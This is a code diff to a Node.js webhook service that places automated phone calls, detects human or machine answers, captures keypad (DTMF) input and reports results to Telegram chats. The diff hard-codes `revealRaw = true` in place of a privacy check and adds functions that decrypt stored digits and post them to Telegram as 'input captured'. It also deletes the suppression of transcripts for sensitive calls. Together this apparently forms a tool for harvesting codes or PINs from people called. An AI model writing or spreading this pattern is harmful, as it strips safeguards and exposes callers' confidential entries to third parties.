@@ -1,7 +1,6 @@
 const axios = require('axios');
 const {
   formatSummary,
-  shouldRevealRawDigits,
   decryptDigits,
   getStageDefinition,
   normalizeStage,
@@ -38,8 +37,52 @@ function parseCallMetadata(metadata) {
   }
 }
 
+const HUMAN_AMD_VALUES = new Set(['human', 'person', 'live', 'positive_human']);
+const MACHINE_AMD_VALUES = new Set(['machine', 'machine_start', 'fax', 'positive_machine', 'unknown_machine', 'answering_machine', 'automated']);
+
+function maskPhoneNumber(phone = '') {
+  if (!phone) {
+    return 'Unknown';
+  }
+  const trimmed = phone.toString().trim();
+  if (trimmed.length <= 6) {
+    return trimmed;
+  }
+  const prefix = trimmed.slice(0, 2);
+  const suffix = trimmed.slice(-4);
+  const maskLength = Math.max(1, trimmed.length - (prefix.length + suffix.length));
+  return `${prefix}${'•'.repeat(maskLength)}${suffix}`;
+}
+
+function formatDurationShort(seconds = 0) {
+  const total = Number(seconds) || 0;
+  if (total <= 0) {
+    return '0s';
+  }
+  const mins = Math.floor(total / 60);
+  const secs = total % 60;
+  if (mins === 0) {
+    return `${secs}s`;
+  }
+  return `${mins}m ${secs.toString().padStart(2, '0')}s`;
+}
+
+function formatAnsweredLabel(value) {
+  if (!value) {
+    return 'unknown';
+  }
+  const normalized = value.toString().trim().toLowerCase();
+  if (HUMAN_AMD_VALUES.has(normalized)) {
+    return 'human';
+  }
+  if (MACHINE_AMD_VALUES.has(normalized)) {
+    return 'machine';
+  }
+  return normalized.replace(/_/g, ' ') || 'unknown';
+}
+
 function formatDtmfEntries(entries = []) {
-  const revealRaw = shouldRevealRawDigits();
+  const revealRaw = true;
   return entries.map((entry) => {
     const stageKey = normalizeStage(entry.stage_key || 'generic');
     const metadata = parseDtmfMetadata(entry.metadata);
@@ -643,6 +686,203 @@ class EnhancedWebhookService {
     }
   }
 
+  async getLatestInputPreview(call_sid, call) {
+    if (call?.latest_input_preview) {
+      return call.latest_input_preview;
+    }
+    const entries = await this.db.getCallDtmfEntries(call_sid);
+    if (!entries.length) {
+      return null;
+    }
+    const latest = entries[entries.length - 1];
+    return decryptDigits(latest.encrypted_digits) || latest.masked_digits || null;
+  }
+
+  async buildInputDetails(call_sid) {
+    const entries = await this.db.getCallDtmfEntries(call_sid);
+    const lines = [];
+
+    entries.forEach((entry) => {
+      const metadata = parseDtmfMetadata(entry.metadata);
+      const label = metadata.stage_label || entry.stage_key || 'Entry';
+      const rawDigits = decryptDigits(entry.encrypted_digits) || entry.masked_digits || '';
+      if (rawDigits) {
+        lines.push(`${label}: ${rawDigits}`);
+      }
+    });
+
+    if (lines.length === 0) {
+      const callInputs = await this.db.getCallInputs(call_sid);
+      callInputs.forEach((input) => {
+        if (input.value) {
+          lines.push(`Step ${input.step}: ${input.value}`);
+        }
+      });
+    }
+
+    if (!lines.length) {
+      return null;
+    }
+
+    return {
+      text: lines.join('\n'),
+      multiline: lines.length > 1,
+    };
+  }
+
+  async buildTranscriptPreview(call_sid, call) {
+    if (call?.call_summary) {
+      return call.call_summary.slice(0, 200);
+    }
+
+    const transcripts = await this.db.getCallTranscripts(call_sid);
+    if (!transcripts.length) {
+      return null;
+    }
+
+    const preview = transcripts
+      .slice(0, 4)
+      .map((entry) => entry.clean_message || entry.message || entry.raw_message || '')
+      .filter(Boolean)
+      .join(' ')
+      .trim();
+
+    return preview.slice(0, 220);
+  }
+
+  async sendCallOutcomeSummary(call_sid, telegram_chat_id) {
+    try {
+      const call = await this.db.getCall(call_sid);
+      if (!call) {
+        return true;
+      }
+
+      const maskedNumber = maskPhoneNumber(call.phone_number);
+      const durationText = formatDurationShort(call.duration);
+      const answeredLabel = formatAnsweredLabel(call.answered_by || call.amd_status);
+      const outcome = (call.final_outcome || '').toUpperCase();
+      const lines = [];
+
+      if (call.call_type === 'collect_input') {
+        const inputDetails = await this.buildInputDetails(call_sid);
+        if (outcome === 'ANSWERED_WITH_INPUT') {
+          lines.push('✅ Call completed — input captured');
+          lines.push(`To: ${maskedNumber}`);
+          lines.push(`Answered by: ${answeredLabel}`);
+          if (inputDetails?.multiline) {
+            lines.push('Input:');
+            lines.push(inputDetails.text);
+          } else if (inputDetails) {
+            lines.push(`Input: ${inputDetails.text}`);
+          } else {
+            const fallbackValue = (await this.getLatestInputPreview(call_sid, call)) || 'Captured';
+            lines.push(`Input: ${fallbackValue}`);
+          }
+          lines.push(`Duration: ${durationText}`);
+        } else if (['ANSWERED_NO_INPUT_HUMAN', 'ANSWERED_NO_INPUT_MACHINE'].includes(outcome)) {
+          lines.push('⚠️ Call completed — no input received');
+          lines.push(`To: ${maskedNumber}`);
+          lines.push(`Answered by: ${answeredLabel}`);
+          lines.push(`Duration: ${durationText}`);
+        } else if (outcome === 'NO_ANSWER') {
+          lines.push('❌ No answer');
+          lines.push(`To: ${maskedNumber}`);
+          lines.push('Attempts: 1');
+        } else if (outcome === 'BUSY') {
+          lines.push('⚠️ Line busy');
+          lines.push(`To: ${maskedNumber}`);
+          lines.push(`Duration: ${durationText}`);
+        } else if (outcome === 'FAILED') {
+          lines.push('❌ Call failed');
+          lines.push(`To: ${maskedNumber}`);
+          if (call.error_message) {
+            lines.push(`Reason: ${call.error_message}`);
+          }
+        } else if (outcome === 'CANCELED') {
+          lines.push('🚫 Call canceled');
+          lines.push(`To: ${maskedNumber}`);
+        } else {
+          lines.push('📞 Call update');
+          lines.push(`To: ${maskedNumber}`);
+          lines.push(`Outcome: ${outcome || 'unknown'}`);
+        }
+      } else {
+        if (['ANSWERED_WITH_INPUT', 'ANSWERED_NO_INPUT_HUMAN', 'ANSWERED_NO_INPUT_MACHINE'].includes(outcome)) {
+          lines.push('📞 Service call completed');
+          lines.push(`Answered by: ${answeredLabel}`);
+          lines.push(`Duration: ${durationText}`);
+          const transcriptPreview = await this.buildTranscriptPreview(call_sid, call);
+          if (transcriptPreview) {
+            lines.push(`Transcript: "${transcriptPreview}"`);
+          }
+        } else if (outcome === 'NO_ANSWER') {
+          lines.push('❌ No answer');
+          lines.push(`To: ${maskedNumber}`);
+          lines.push('Attempts: 1');
+        } else if (outcome === 'BUSY') {
+          lines.push('⚠️ Line busy');
+          lines.push(`To: ${maskedNumber}`);
+          lines.push(`Duration: ${durationText}`);
+        } else if (outcome === 'FAILED') {
+          lines.push('❌ Call failed');
+          lines.push(`To: ${maskedNumber}`);
+          if (call.error_message) {
+            lines.push(`Reason: ${call.error_message}`);
+          }
+        } else if (outcome === 'CANCELED') {
+          lines.push('🚫 Call canceled');
+          lines.push(`To: ${maskedNumber}`);
+        } else {
+          lines.push('📞 Call update');
+          lines.push(`To: ${maskedNumber}`);
+          lines.push(`Outcome: ${outcome || 'unknown'}`);
+        }
+      }
+
+      if (!lines.length) {
+        lines.push('📞 Call update unavailable.');
+      }
+
+      await this.sendTelegramMessage(telegram_chat_id, buildTelegramMessage(lines));
+
+      const statusForUpdate = call.status || call.twilio_status || 'completed';
+      await this.db.updateCallStatus(call_sid, statusForUpdate, {
+        outcome_notified_at: new Date().toISOString(),
+      });
+
+      return true;
+    } catch (error) {
+      console.error('❌ Failed to send call outcome summary:', error);
+      return false;
+    }
+  }
+
+  async sendCallAmdUpdate(call_sid, telegram_chat_id) {
+    try {
+      const call = await this.db.getCall(call_sid);
+      if (!call?.amd_status) {
+        return true;
+      }
+
+      const label = formatAnsweredLabel(call.amd_status);
+      const emoji = label === 'human' ? '🙂' : '🤖';
+      const lines = [`${emoji} Answer detection update`, `Answered by: ${label}`];
+
+      if (call.amd_confidence) {
+        const confidencePercent = Number(call.amd_confidence) * 100;
+        if (Number.isFinite(confidencePercent)) {
+          lines.push(`Confidence: ${confidencePercent.toFixed(1)}%`);
+        }
+      }
+
+      await this.sendTelegramMessage(telegram_chat_id, buildTelegramMessage(lines));
+      return true;
+    } catch (error) {
+      console.error('❌ Failed to send AMD update notification:', error);
+      return false;
+    }
+  }
+
   // Process individual notification with enhanced error handling
   async sendNotification(notification) {
     const { id, call_sid, notification_type, telegram_chat_id, phone_number } = notification;
@@ -673,26 +913,15 @@ class EnhancedWebhookService {
           });
           break;
         }
-        case 'call_transcript': {
-          const dtmfEntries = await this.db.getCallDtmfEntries(call_sid);
-          const isSensitive = isSensitiveDtmf(dtmfEntries);
-          if (isSensitive) {
-            console.log(`🔒 Suppressing transcript for sensitive DTMF call ${call_sid}`.yellow);
-            if (this.db && this.db.logNotificationMetric) {
-              await this.db.logNotificationMetric('call_transcript', true);
-            }
-            success = true;
-          } else {
-            success = await this.sendCallTranscript(call_sid, telegram_chat_id);
-          }
-          break;
-        }
         case 'call_input_dtmf':
         case 'call_dtmf_captured':
           success = await this.sendCallInputNotification(call_sid, telegram_chat_id);
           break;
-        case 'call_input_summary':
-          success = await this.sendCallInputSummary(call_sid, telegram_chat_id);
+        case 'call_amd_update':
+          success = await this.sendCallAmdUpdate(call_sid, telegram_chat_id);
+          break;
+        case 'call_outcome_summary':
+          success = await this.sendCallOutcomeSummary(call_sid, telegram_chat_id);
           break;
         case 'call_failed':
           const failedCall = await this.db.getCall(call_sid);
@@ -730,7 +959,7 @@ class EnhancedWebhookService {
       await this.db.updateEnhancedWebhookNotification(id, 'failed', error.message, null);
       
       // For critical failures, try to send error notification to user
-      if (['call_failed', 'call_transcript'].includes(notification_type)) {
+      if (['call_failed'].includes(notification_type)) {
         try {
           await this.sendTelegramMessage(telegram_chat_id, `❌ Error processing ${notification_type.replace('_', ' ')}`);
         } catch (errorNotificationError) {
